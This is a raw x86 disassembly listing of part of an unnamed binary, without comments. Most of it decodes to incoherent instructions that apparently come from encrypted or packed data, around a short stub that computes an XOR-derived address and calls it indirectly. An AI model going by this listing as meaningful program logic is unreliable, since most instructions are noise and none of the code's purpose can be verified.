  415fd3:	cli    
  415fd4:	mov    dl,0xf4
  415fd6:	test   BYTE PTR [eax],bh
  415fd8:	fist   WORD PTR [esi]
  415fda:	mov    eax,ds:0x45ef2fd4
  415fdf:	fs ds cmp dh,ah
  415fe3:	inc    edx
  415fe4:	mov    bl,0x9f
  415fe6:	dec    edi
  415fe7:	or     eax,0x8f08e973
  415fec:	xchg   al,bl
  415fee:	out    dx,al
  415fef:	jge    0x415f82
  415ff1:	xchg   DWORD PTR [esi-0x1bb855df],edi
  415ff7:	adc    DWORD PTR [edi],eax
  415ff9:	test   al,0xd0
  415ffb:	dec    ebp
  415ffc:	mov    eax,ds:0x36b02911
  416001:	aaa    
  416002:	ss jp  0x416071
  416005:	lds    eax,FWORD PTR [ebx+0x1443e529]
  41600b:	mov    ebp,0xe1f7b1aa
  416010:	imul   edx,DWORD PTR [edi-0x19552ddf],0x1db81fa6
  41601a:	dec    eax
  41601b:	mov    ah,0x77
  41601d:	stc    
  41601e:	jno    0x41603b
  416020:	cld    
  416021:	xchg   DWORD PTR [edi-0x11],edi
  416024:	cli    
  416025:	mov    eax,ds:0x2c2508b8
  41602a:	lods   al,BYTE PTR ds:[esi]
  41602b:	mov    eax,0xfdfb048f
  416030:	pop    ds
  416031:	pop    edx
  416032:	outs   dx,DWORD PTR ds:[esi]
  416033:	inc    ebp
  416034:	mov    dl,0x93
  416036:	fmul   DWORD PTR [edx+0x6c7e6ae8]
  41603c:	(bad)  
  41603d:	mov    esp,DWORD PTR [eax]
  41603f:	adc    DWORD PTR [edx],edx
  416041:	lods   al,BYTE PTR ds:[esi]
  416042:	xchg   esi,eax
  416043:	or     ebx,DWORD PTR [ebx-0x4e91e521]
  416049:	sub    eax,DWORD PTR [eax-0x454b472e]
  41604f:	popf   
  416050:	or     al,0x4e
  416052:	xor    al,0xf4
  416054:	stos   BYTE PTR es:[edi],al
  416055:	pop    ss
  416056:	mov    al,0x6a
  416058:	out    0xcf,eax
  41605a:	daa    
  41605b:	into   
  41605c:	sbb    BYTE PTR [ecx],cl
  41605e:	add    eax,0xd3361c47
  416063:	neg    BYTE PTR [eax+0x558b30c3]
  416069:	or     BYTE PTR [ebx],dh
  41606b:	ror    DWORD PTR [ebp+0x729c1084],0x32
  416072:	add    BYTE PTR [ecx+0x458b0845],cl
  416078:	call   0x3355b608
  41607d:	rol    DWORD PTR [ebx],0xc6
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160e6
  41609a:	xchg   eax,edi
  41609c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41609d:	retf   0x7f17
  4160a0:	jo     0x41605b
  4160a2:	jle    0x416114
  4160a4:	jo     0x416028
  4160a6:	xor    esi,DWORD PTR [ebx-0x4bc2a45e]
  4160ac:	cmp    ah,bl
  4160ae:	and    BYTE PTR [ecx],0x0
  4160b1:	pushf  
  4160b2:	pop    eax
  4160b3:	int    0xa9
  4160b5:	jl     0x4160f3
  4160b7:	out    0x51,al
  4160b9:	cdq    
  4160ba:	fsub   QWORD PTR [ebx]
  4160bc:	xor    BYTE PTR [ebx],dh
  4160be:	loopne 0x4160f4
  4160c0:	in     al,dx
  4160c1:	(bad)  
  4160c2:	xchg   esp,eax
  4160c3:	push   0x1dde38a0
  4160c8:	ja     0x4160f6
  4160ca:	jmp    0x41605d
  4160cc:	cmp    edi,DWORD PTR [eax+0x5b]
  4160cf:	imul   esi,DWORD PTR [eax+0x59],0xd5eb7aa
  4160d6:	aaa    
  4160d7:	scas   al,BYTE PTR es:[edi]
  4160d8:	add    DWORD PTR [ebx+0x38],esi
  4160db:	imul   edi,DWORD PTR [edi+ebp*4],0xc0233b6a
  4160e2:	fucomi st,st(5)
  4160e4:	dec    esp
  4160e5:	mov    esp,0x41f93267
  4160ea:	aaa    
  4160eb:	adc    BYTE PTR [ebx+0x1e],dl
  4160ee:	pop    eax
  4160ef:	jmp    0xb496c64
  4160f4:	jbe    0x416110
  4160f6:	aad    0xc5
  4160f8:	dec    esp
  4160f9:	cmc    
  4160fa:	sub    DWORD PTR [ebx-0x35],0xe7534b2e
  416101:	pop    edx
  416102:	pop    es
  416103:	jg     0x4160a3
  416105:	push   ebp
  416106:	or     eax,0x65395897
  41610b:	mov    bh,0x3b
  41610d:	out    0xad,eax
  41610f:	xchg   ebx,eax
  416110:	xor    DWORD PTR [ecx+0x7154612],ebp
  416116:	jecxz  0x4160ae
  416118:	lods   eax,DWORD PTR ds:[esi]
  416119:	fisubr WORD PTR [ebp+0x40801200]
  41611f:	adc    ebp,DWORD PTR [ecx+eiz*8-0x3d]
  416123:	push   ecx
  416124:	add    BYTE PTR [ecx-0x6e44be88],ch
  41612a:	adc    BYTE PTR ds:0xdb01aa75,al
  416130:	jno    0x41611e
  416132:	mov    dl,0x30
  416134:	mov    eax,0x7e024b73
  416139:	int3   
  41613a:	jecxz  0x4161a9
  41613c:	adc    bl,BYTE PTR [ebp-0xa]
  41613f:	popf   
  416140:	jo     0x41614b
  416142:	stos   BYTE PTR es:[edi],al
  416143:	xchg   edx,eax
  416144:	iret   
  416145:	mov    al,0x71
  416147:	pop    edx
  416148:	inc    ebx
  416149:	cdq    
  41614a:	in     al,0x2e
  41614c:	xchg   edi,eax
  41614d:	scas   al,BYTE PTR es:[edi]
  41614e:	xchg   esp,eax
  41614f:	test   eax,0xffbb9474
  416154:	jge    0x416198
  416156:	clc    
  416157:	dec    eax
  416158:	rcr    BYTE PTR [edx+0x58],1
  41615b:	sahf   
  41615c:	lahf   
  41615d:	jge    0x4161c3
  41615f:	ins    DWORD PTR es:[edi],dx
  416160:	jl     0x4160e4
  416162:	imul   ebp
  416164:	inc    edi
  416165:	push   esp
  416166:	loopne 0x416180
  416168:	mov    edx,0x2598335a
  41616d:	jae    0x416128
  41616f:	mov    ah,bl
  416171:	cdq    
  416172:	and    al,0x2f
  416174:	mov    dh,BYTE PTR [eax+0x2eb32c8f]
  41617a:	xchg   DWORD PTR [edi-0x7e16863e],ecx
  416180:	retf   
  416181:	fwait
  416182:	aam    0xef
  416184:	popf   
  416185:	ds addr16 cmp al,0xe5
  416189:	fnstsw WORD PTR [eax]
  41618b:	rcl    BYTE PTR [eax],0x96
  41618e:	jl     0x41619a
  416190:	pop    DWORD PTR [ecx-0x232c3b5f]
  416196:	mov    cl,0x74
  416198:	xor    eax,0x83c3c7bd
  41619d:	sbb    esi,DWORD PTR [ebx-0x42]
  4161a0:	cmp    DWORD PTR [ebx-0x7733d13d],0xd
  4161a7:	or     esi,DWORD PTR [ecx]
  4161a9:	or     BYTE PTR [edx],bl
  4161ab:	or     BYTE PTR [edi+0x1e9baa3a],al
  4161b1:	push   0x4e
  4161b3:	pop    eax
  4161b4:	shl    DWORD PTR [edi],0x1d
  4161b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161b8:	add    al,0xa4
  4161ba:	pushf  
  4161bb:	sar    edi,cl
  4161bd:	iret   
  4161be:	ds push es
  4161c0:	fisub  WORD PTR [edi+0x7feaf33f]
  4161c6:	adc    al,0xff
  4161c8:	test   ebx,ebx
  4161ca:	inc    ecx
  4161cb:	ja     0x41619c
  4161cd:	adc    ecx,eax
  4161cf:	leave  
  4161d0:	xlat   BYTE PTR ds:[ebx]
  4161d1:	xor    al,0x2
  4161d3:	into   
  4161d4:	pop    es
  4161d5:	push   edi
  4161d6:	std    
  4161d7:	push   edi
  4161d8:	pop    ss
  4161d9:	arpl   WORD PTR [ecx+0x13b584c1],bx
  4161df:	sar    DWORD PTR [edi+0x15],0xeb
  4161e3:	repz cmp esi,DWORD PTR [edx-0x36]
  4161e7:	mov    ecx,0xdd4535f6
  4161ec:	and    ecx,edi
  4161ee:	jge    0x4161a4
  4161f0:	cmp    DWORD PTR [eax+eax*8],edx
  4161f3:	pop    ds
  4161f4:	dec    ecx
  4161f5:	cmp    al,0x63
  4161f7:	gs inc esi
  4161f9:	mov    ebp,0xfa24cf12
  4161fe:	pop    edx
  4161ff:	fnstenv [edx]
  416201:	outs   dx,BYTE PTR ds:[esi]
  416202:	push   cs
  416203:	lock sbb BYTE PTR [esi-0x2791eeaa],0x64
  41620b:	jmp    0x416206
  41620d:	rol    BYTE PTR [esp+ebx*2+0x74],0xf4
  416212:	test   al,0x3b
  416214:	rol    BYTE PTR ds:0xb21d0bea,0xef
  41621b:	xor    eax,0xb057eb44
  416220:	inc    esi
  416221:	adc    BYTE PTR [ebx],ah
  416223:	xor    DWORD PTR [eax-0x3254c974],esi
  416229:	sub    DWORD PTR [ebp-0x4ced6850],esp
  41622f:	ins    BYTE PTR es:[edi],dx
  416230:	push   0xffffffde
  416232:	adc    bl,cl
  416234:	dec    ecx
  416235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416236:	ins    DWORD PTR es:[edi],dx
  416237:	pusha  
  416238:	test   DWORD PTR ds:0x13824c0d,ecx
  41623e:	gs scas al,BYTE PTR es:[edi]
  416240:	ret    
  416241:	xchg   ecx,eax
  416242:	pop    ds
  416243:	test   eax,0x845c8668
  416248:	adc    eax,0x4c49e460
  41624d:	fstp   QWORD PTR [edi-0x29]
  416250:	dec    ecx
  416251:	outs   dx,DWORD PTR ds:[esi]
  416252:	mov    ?,WORD PTR [ecx+0x58ec0dd6]
  416258:	call   0x716b:0xa3b3ba2d
  41625f:	lds    edi,FWORD PTR [edx+0x7b6d91b9]
  416265:	push   cs
  416266:	rcl    dl,0x33
  416269:	sbb    dh,0x9f
  41626c:	fs ins BYTE PTR es:[edi],dx
  41626e:	mov    cl,0xcf
  416270:	out    0xd,al
  416272:	fcmovbe st,st(7)
  416274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416275:	enter  0x1b1b,0x19
  416279:	push   es
  41627a:	xchg   ebp,eax
  41627b:	aaa    
  41627c:	jo     0x416244
  41627e:	jecxz  0x416205
  416280:	mov    ebp,0xcd711e7d
  416285:	test   BYTE PTR [ecx],bh
  416287:	enter  0x1812,0x9e
  41628b:	inc    esi
  41628c:	arpl   WORD PTR [edi+0x2e],si
  41628f:	push   0xffffffc9
  416291:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416292:	push   ecx
  416293:	sahf   
  416294:	lock div BYTE PTR [edx+ecx*4-0x423a069a]
  41629c:	out    0x37,al
  41629e:	push   ss
  41629f:	dec    eax
  4162a0:	and    ah,0x4d
  4162a3:	lahf   
  4162a4:	or     DWORD PTR [eax-0x30],edi
  4162a7:	ins    DWORD PTR es:[edi],dx
  4162a8:	fcomp  QWORD PTR [edx+0x7c]
  4162ab:	jle    0x4162db
  4162ad:	hlt    
  4162ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162af:	jns    0x4162c5
  4162b1:	mov    ch,0x8a
  4162b3:	inc    ebx
  4162b4:	xor    BYTE PTR [ebx+0x6b],bh
  4162b7:	aam    0xf1
  4162b9:	fidivr DWORD PTR [ecx+edi*4-0x71]
  4162bd:	stc    
  4162be:	adc    bl,ch
  4162c0:	fwait
  4162c1:	push   es
  4162c2:	inc    esp
  4162c3:	xlat   BYTE PTR ds:[ebx]
  4162c4:	sbb    bh,bl
  4162c6:	push   0x6432ccf6
  4162cb:	sbb    al,0x37
  4162cd:	in     eax,dx
  4162ce:	xchg   BYTE PTR [esi-0x39136ec0],al
  4162d4:	inc    ebx
  4162d6:	add    ebx,eax
  4162d8:	mov    dh,0x1d
  4162da:	icebp  
  4162db:	inc    esp
  4162dc:	pusha  
  4162dd:	(bad)  
  4162de:	out    dx,al
  4162df:	es sar al,1
  4162e2:	push   edi
  4162e3:	push   edx
  4162e4:	stc    
  4162e5:	lods   al,BYTE PTR ds:[esi]
  4162e6:	out    0x95,al
  4162e8:	push   ss
  4162e9:	ror    DWORD PTR [ecx],0x48
  4162ec:	fldcw  WORD PTR [bx-0x45]
  4162f0:	icebp  
  4162f1:	leave  
  4162f2:	jecxz  0x416332
  4162f4:	fstp   QWORD PTR [esi+0x62d4091a]
  4162fa:	sbb    al,0xe8
  4162fc:	mov    eax,0xe9485409
  416301:	icebp  
  416302:	fcomp  QWORD PTR [edx-0x69]
  416305:	and    eax,0x5f57b2a8
  41630a:	inc    ecx
  41630b:	push   ebx
  41630c:	or     eax,0x5d7f3921
  416311:	neg    BYTE PTR [ebx]
  416313:	sub    ecx,ecx
  416315:	xchg   ecx,eax
  416316:	cmp    al,0x30
  416318:	and    DWORD PTR [eax],edi
  41631a:	fwait
  41631b:	inc    ebx
  41631c:	jmp    0xfbbae47d
  416321:	jp     0x4162ac
  416323:	or     al,0x79
  416325:	pop    esp
  416326:	push   cs
  416327:	cmc    
  416328:	pushw  cs
  41632a:	je     0x416323
  41632c:	fild   QWORD PTR [ebx+0x53]
  41632f:	cmp    eax,0x745cc6d4
  416334:	push   ss
  416335:	xchg   esi,eax
  416336:	pop    edi
  416337:	mov    es,WORD PTR [ebx-0x65]
  41633a:	pusha  
  41633b:	adc    eax,0xfcd75ef7
  416340:	pop    edx
  416341:	mov    ecx,0x934287c3
  416346:	xchg   ecx,eax
  416347:	mov    ecx,0xe69fcc77
  41634c:	jmp    0x416326
  41634e:	mov    WORD PTR [edx],es
  416350:	shr    BYTE PTR [eax+0x3dc309f3],cl
  416356:	mov    BYTE PTR [edx],al
  416358:	mov    ds:0xc3b4e2e8,eax
  41635d:	sbb    ebx,DWORD PTR [ebp-0x44]
  416360:	jmp    0x3ea7a7b3
  416365:	cwde   
  416366:	sub    BYTE PTR [edi+0x6282f8f8],bl
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x4649c841
  4163bf:	stos   BYTE PTR es:[edi],al
  4163c0:	rcl    DWORD PTR [ebx],0x14
  4163c3:	jg     0x416435
  4163c5:	mov    ecx,0x1f70707e
  4163ca:	fsub   DWORD PTR [eax+eiz*1]
  4163cd:	sbb    eax,0xbbc3b1d2
  4163d2:	xchg   edi,eax
  4163d3:	jl     0x4163d7
  4163d5:	sub    esi,DWORD PTR [ecx]
  4163d7:	js     0x41637c
  4163d9:	and    edi,eax
  4163db:	dec    ebp
  4163dc:	sti    
  4163dd:	mov    dh,0x80
  4163df:	and    BYTE PTR [edi],ah
  4163e1:	fisub  WORD PTR [ebx-0x62]
  4163e4:	clc    
  4163e5:	and    al,0x9b
  4163e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e9:	ret    
  4163ea:	adc    dh,BYTE PTR [ebx+0x39bfd571]
  4163f0:	pop    esp
  4163f1:	call   0x90e4:0xf59b2a24
  4163f8:	addr16 sub al,0xed
  4163fb:	mov    dh,0x9e
  4163fd:	and    ebx,DWORD PTR [edi]
  4163ff:	dec    ecx
  416400:	mov    ch,0x73
  416402:	jmp    0x41640f
  416404:	push   edx
  416405:	mov    ecx,0x759cd514
  41640a:	gs add eax,0xa2a47cd7
  416410:	xchg   edx,eax
  416411:	adc    DWORD PTR [ecx+0x25],0x38394da7
  416418:	add    al,0x75
  41641a:	push   edx
  41641b:	hlt    
  41641c:	sbb    esp,edi
  41641e:	ss jmp 0xbe27:0x425412ff
  416426:	or     al,0xff
  416428:	xchg   ecx,eax
  416429:	out    0x3,eax
  41642b:	and    DWORD PTR [edx-0x6ae874e4],0xffffff82
  416432:	pop    ss
  416433:	stos   DWORD PTR es:[edi],eax
  416434:	mov    esp,edx
  416436:	loop   0x4164ae
  416438:	dec    esi
  416439:	pop    es
  41643a:	pushf  
  41643b:	or     DWORD PTR [esp+eiz*4-0x2e],0xffffffba
  416440:	outs   dx,DWORD PTR ds:[esi]
  416441:	and    edi,edi
  416443:	arpl   WORD PTR [ecx+0x65],cx
  416446:	daa    
  416447:	mov    cl,0xfb
  416449:	mov    eax,0xe019b721
  41644e:	scas   eax,DWORD PTR es:[edi]
  41644f:	sub    al,0x71
  416451:	ins    DWORD PTR es:[edi],dx
  416452:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416453:	xor    ah,BYTE PTR [edx+0x3]
  416456:	in     al,dx
  416457:	push   ds
  416458:	cmp    DWORD PTR [esp+eiz*2+0x442d26fd],0xe
  416460:	in     eax,0x61
  416462:	in     eax,0xd6
  416464:	mov    ah,0x4c
  416466:	pop    eax
  416467:	cmc    
  416468:	je     0x4164d1
  41646a:	push   esi
  41646b:	mov    WORD PTR [ebx-0x43],ss
  41646e:	xor    al,0xf
  416470:	out    dx,al
  416471:	or     ch,BYTE PTR [edi-0x43319741]
  416477:	sub    eax,0x7746eac6
  41647c:	mov    ah,0xf8
  41647e:	push   ebx
  41647f:	fnstsw WORD PTR [ebx]
  416481:	and    BYTE PTR [edx+0x29],ch
  416484:	xchg   ecx,eax
  416485:	popa   
  416486:	mov    edi,0x5d7f086c
  41648b:	or     ebp,DWORD PTR [eax+ebx*2+0x1d]
  41648f:	inc    edx
  416490:	sub    eax,edx
  416492:	sbb    eax,0x6eaf986d
  416497:	loopne 0x4164f4
  416499:	imul   eax,esi,0xac96663d
  41649f:	and    eax,0xcfafc917
  4164a4:	xor    BYTE PTR [ebx+0x59],bl
  4164a7:	pop    esi
  4164a8:	inc    esp
  4164a9:	imul   ebx,DWORD PTR [esi-0x6],0x2311ad4b
  4164b0:	mov    bl,BYTE PTR [edx+0x2569f359]
  4164b6:	scas   al,BYTE PTR es:[edi]
  4164b7:	mov    dl,bl
  4164b9:	xor    BYTE PTR [ebp+0x5a82a51f],ch
  4164bf:	add    al,0x10
  4164c1:	add    BYTE PTR [ebx+0x427395e9],ah
  4164c7:	jp     0x41646f
  4164c9:	inc    esp
  4164ca:	inc    esi
  4164cb:	mov    BYTE PTR [ecx+0x45e5640d],ah
  4164d1:	mov    esp,0x936fe141
  4164d6:	les    edi,FWORD PTR [esi]
  4164d8:	rcl    BYTE PTR [edi],0x82
  4164db:	adc    al,0x54
  4164dd:	repz xchg ebx,eax
  4164df:	mov    ecx,0xc7b9129
  4164e4:	or     al,0x34
  4164e6:	hlt    
  4164e7:	dec    DWORD PTR [ebx-0x29]
  4164ea:	xchg   esp,eax
  4164eb:	xor    al,0x51
  4164ed:	fstp   DWORD PTR [ebp+0x38]
  4164f0:	xchg   esp,eax
  4164f2:	pop    ebp
  4164f3:	(bad)  
  4164f4:	fdiv   QWORD PTR [ebp+0x1720f137]
  4164fa:	jp     0x416501
  4164fc:	pop    ebp
  4164fd:	shr    DWORD PTR [edi],1
  4164ff:	hlt    
  416500:	scas   al,BYTE PTR es:[edi]
  416501:	into   
  416502:	adc    al,0xf9
  416504:	fsub   QWORD PTR [ecx]
  416506:	dec    ebx
  416507:	scas   al,BYTE PTR es:[edi]
  416508:	mov    edx,0x11c9364e
  41650d:	outs   dx,DWORD PTR ds:[esi]
  41650e:	push   ss
  41650f:	and    al,0x27
  416511:	call   0xac4dd711
  416516:	mov    ebx,0xf59fae2a
  41651b:	enter  0x8a41,0xa6
  41651f:	cmp    eax,DWORD PTR [edx]
  416521:	out    0xfb,eax
  416523:	jge    0x416557
  416525:	ja     0x416567
  416527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416528:	push   esp
  416529:	pop    ebp
  41652a:	neg    DWORD PTR [ecx-0x3a]
  41652d:	loopne 0x416592
  41652f:	fwait
  416530:	or     DWORD PTR [esp+ecx*8],0x30
  416534:	mov    cl,0x4d
  416536:	add    ch,BYTE PTR [eax]
  416538:	or     ah,BYTE PTR [esi]
  41653a:	sub    BYTE PTR [eax-0x59],dh
  41653d:	sub    DWORD PTR [esi+0x5baf62fb],edi
  416543:	push   0x7413b7fd
  416548:	mov    ebx,0x21f856a3
  41654d:	cld    
  41654e:	jecxz  0x416517
  416550:	xor    al,0xdd
  416552:	repnz (bad) 
  416554:	adc    al,0x36
  416556:	test   BYTE PTR [edx+0x52],al
  416559:	sbb    al,0x2d
  41655b:	ins    DWORD PTR es:[edi],dx
  41655c:	out    dx,al
  41655d:	xchg   ebp,eax
  41655e:	mov    WORD PTR [ecx+0x3a8500ea],ss
  416564:	sbb    DWORD PTR [bp+di-0x1ae2],ebx
  416569:	repz ficomp DWORD PTR [esi]
  41656c:	mov    WORD PTR [ebx+0x46557f1b],es
  416572:	retf   
  416573:	mov    edi,0x9a34a4bf
  416578:	xor    ch,BYTE PTR [edi]
  41657a:	cmp    dl,cl
  41657c:	ror    BYTE PTR [ebp-0x50468e6d],cl
  416582:	loop   0x4165cb
  416584:	ret    
  416585:	add    esi,DWORD PTR [esi-0x1453e128]
  41658b:	call   0xd2ea4d28
  416590:	xchg   ebp,eax
  416591:	or     al,0x11
  416593:	adc    DWORD PTR [edx],eax
  416595:	mov    ds:0xec0090c0,eax
  41659a:	sub    ecx,edx
  41659c:	ficomp WORD PTR [ebx]
  41659e:	jmp    0x132:0xc8a5a69f
  4165a5:	cdq    
  4165a6:	sub    edx,DWORD PTR [ebx-0x118e5239]
  4165ac:	lods   eax,DWORD PTR ds:[esi]
  4165ad:	xchg   ebp,eax
  4165ae:	dec    esp
  4165af:	jno    0x416618
  4165b1:	push   edx
  4165b2:	imul   ebp,DWORD PTR [ecx+eiz*2+0x3437d22],0xbe4d5355
  4165bd:	stos   BYTE PTR es:[edi],al
  4165be:	push   0xefe91be7
  4165c3:	xor    eax,0x101e7ed0
  4165c8:	gs cli 
  4165ca:	xchg   edi,eax
  4165cb:	inc    ebx
  4165cc:	pop    ds
  4165cd:	rcr    DWORD PTR [esi+0x4668009a],cl
  4165d3:	clc    
  4165d4:	mov    ebx,0x38349c6a
  4165d9:	mov    ah,0x22
  4165db:	sub    edx,edi
  4165dd:	pop    esp
  4165de:	mov    edi,0x686af6b0
  4165e3:	mov    eax,ds:0xf230645b
  4165e8:	out    dx,al
  4165e9:	popa   
  4165ea:	jg     0x41666a
  4165ec:	mov    dl,cl
  4165ee:	mov    eax,ds:0x829f0933
  4165f3:	loopne 0x41659c
  4165f5:	(bad)  
  4165f6:	adc    al,0xf9
  4165f8:	and    al,BYTE PTR [eax+edi*2-0x4d2d7d8e]
  4165ff:	add    dh,BYTE PTR [ecx+0x55]
  416602:	nop
  416603:	push   cs
  416604:	and    al,0x9f
  416606:	fidivr WORD PTR [esi-0x52]
  416609:	daa    
  41660a:	rcl    BYTE PTR [edx-0x67],cl
  41660d:	out    dx,eax
  41660e:	push   esp
  41660f:	cmp    edx,DWORD PTR [ecx-0x4f30f11b]
  416615:	out    0x93,al
  416617:	jnp    0x416664
  416619:	scas   al,BYTE PTR es:[edi]
  41661a:	aad    0x8
  41661c:	pop    eax
  41661d:	rcr    cl,cl
  41661f:	(bad)  
  416620:	(bad)  
  416621:	stc    
  416622:	xchg   esp,eax
  416623:	dec    eax
  416624:	cmp    DWORD PTR [esi-0x15],edi
  416627:	sbb    al,0xdf
  416629:	or     BYTE PTR [ecx-0x46],ah
  41662c:	fld    QWORD PTR [ecx]
  41662e:	jne    0x41665f
  416630:	xor    edi,DWORD PTR [edi+0x1]
  416633:	ins    BYTE PTR es:[edi],dx
  416634:	xchg   ecx,eax
  416635:	std    
  416636:	dec    edi
  416637:	cmp    bl,ah
  416639:	out    0xc2,al
  41663b:	fs inc ebx
  41663d:	mov    bl,0xc
  41663f:	stos   DWORD PTR es:[edi],eax
  416640:	hlt    
  416641:	jnp    0x41667e
  416643:	and    esp,DWORD PTR [edi-0x6e]
  416646:	aas    
  416647:	stc    
  416648:	fist   WORD PTR [esi]
  41664a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41664b:	sub    DWORD PTR cs:[ebx],edx
  41664e:	iret   
  41664f:	cli    
  416650:	mov    eax,0x4d016501
  416655:	out    dx,eax
  416656:	or     al,0x49
  416658:	in     al,0xb8
  41665a:	imul   ecx,DWORD PTR ds:0x9f09638f,0xfffffff0
  416661:	or     al,0x2b
  416663:	fs repz test eax,0xf57d85ee
  41666a:	addr16 or edx,ebx
  41666d:	or     BYTE PTR [ebx+0x2d0d462c],0xd9
  416674:	popf   
  416675:	ins    DWORD PTR es:[edi],dx
  416676:	push   0x6c918ffc
  41667b:	pusha  
  41667c:	xchg   esi,eax
  41667d:	adc    DWORD PTR [eax+0xd5ec15c],ecx
  416683:	sub    BYTE PTR [eax-0x6f],dl
  416686:	dec    edx
  416687:	in     eax,0x4c
  416689:	fbstp  TBYTE PTR [ecx+ecx*2-0x25187e5d]
  416690:	xchg   edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x4166d6
  4166ae:	jbe    0x41672d
  4166b0:	sub    al,0x5c
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0xa270707e
  4166ba:	loope  0x4166a5
  4166bc:	inc    esp
  4166bd:	enter  0xd208,0xd2
  4166c1:	push   ebx
  4166c2:	pop    edi
  4166c3:	mov    dh,0x84
  4166c5:	adc    eax,0x9089dfed
  4166ca:	push   0x26
  4166cc:	mov    al,ds:0x2116c9b3
  4166d1:	pop    ss
  4166d2:	dec    eax
  4166d3:	int3   
  4166d4:	(bad)  
  4166d5:	mov    esi,DWORD PTR [edi+0x3b]
  4166d8:	sbb    esp,DWORD PTR [esi]
  4166da:	jle    0x416738
  4166dc:	hlt    
  4166dd:	adc    eax,0xb9444cf7
  4166e2:	mov    dl,0xde
  4166e4:	adc    BYTE PTR [edx],dh
  4166e6:	jbe    0x4166f0
  4166e8:	and    al,0xd7
  4166ea:	mov    dh,0xe1
  4166ec:	mov    BYTE PTR [edi],ch
  4166ee:	push   ds
  4166ef:	or     BYTE PTR [esi+ebp*2-0x38],0x22
  4166f4:	aaa    
  4166f5:	stos   DWORD PTR es:[edi],eax
  4166f6:	adc    BYTE PTR [edx],bl
  4166f8:	iret   
  4166f9:	cmp    ecx,DWORD PTR [ebp+0x53477d34]
  4166ff:	imul   ebp,DWORD PTR [esi-0x19],0x9e67db3a
  416706:	xchg   ebp,eax
  416707:	retf   0x3e7b
  41670a:	outs   dx,DWORD PTR ds:[esi]
  41670b:	out    dx,al
  41670c:	mov    bl,0x85
  41670e:	xchg   edi,eax
  41670f:	loope  0x4166fc
  416711:	into   
  416712:	cs into 
  416714:	xor    al,0x42
  416716:	pop    edx
  416717:	retf   
  416718:	in     al,0xf2
  41671a:	int    0xf9
  41671c:	jmp    0xb9321910
  416721:	add    edx,DWORD PTR [ebx]
  416723:	arpl   ax,bx
  416725:	rol    ebp,1
  416727:	retf   
  416728:	mov    edx,0xf47381ce
  41672d:	lea    ebp,[ecx]
  41672f:	cwde   
  416730:	jge    0x416797
  416732:	inc    edi
  416733:	sub    esi,eax
  416735:	aas    
  416736:	(bad)  
  416737:	cmp    eax,0x76e974bf
  41673c:	mov    dh,0xa3
  41673e:	mov    ds:0x8da3b742,al
  416743:	sub    edx,DWORD PTR [ecx+0x12ef170b]
  416749:	dec    ebx
  41674a:	sbb    DWORD PTR [eax],esi
  41674c:	(bad)  
  41674d:	jno    0x41673c
  41674f:	adc    DWORD PTR [eax+eiz*1],edi
  416752:	hlt    
  416753:	fsubr  QWORD PTR [ecx]
  416755:	add    BYTE PTR [esi-0x4886f214],ch
  41675b:	imul   esp,esi,0x8ab3f17e
  416761:	rol    BYTE PTR ds:0x82be3d64,cl
  416767:	or     al,0x71
  416769:	and    bh,BYTE PTR [esi+0x19]
  41676c:	mov    al,0x3b
  41676e:	in     al,dx
  41676f:	iret   
  416770:	add    DWORD PTR [eax-0x53f9758a],ebp
  416776:	push   ss
  416777:	mov    ebx,0x8dc2d908
  41677c:	in     al,dx
  41677d:	cmp    DWORD PTR [edi-0x590028d6],edi
  416783:	sbb    BYTE PTR [edx+0xe3f8e92],al
  416789:	jge    0x41678e
  41678b:	xchg   ecx,eax
  41678c:	adc    al,0x60
  41678e:	jo     0x4167b7
  416790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416791:	sub    dh,cl
  416793:	rol    DWORD PTR [ecx+ecx*4],1
  416796:	pop    es
  416797:	jnp    0x41678d
  416799:	aas    
  41679a:	xchg   esp,eax
  41679b:	xchg   ecx,eax
  41679c:	data16 ja 0x416799
  41679f:	xchg   BYTE PTR [esi+0x30],dl
  4167a2:	rol    esi,cl
